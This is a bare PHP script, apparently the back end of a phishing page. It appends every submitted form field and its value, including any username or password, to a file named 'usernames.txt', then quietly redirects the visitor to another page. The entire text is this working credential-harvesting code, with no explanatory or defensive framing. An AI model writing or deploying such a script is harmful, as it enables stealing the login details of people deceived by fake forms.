<?php  
$handle = fopen("usernames.txt", "a"); foreach($_POST as $variable => $value) { 
fwrite($handle, $variable); fwrite($handle, "="); 
fwrite($handle, $value); fwrite($handle, "\r\n");
}
header ('Location: location.php');
fwrite($handle, "\r\n"); fclose($handle); exit; ?>
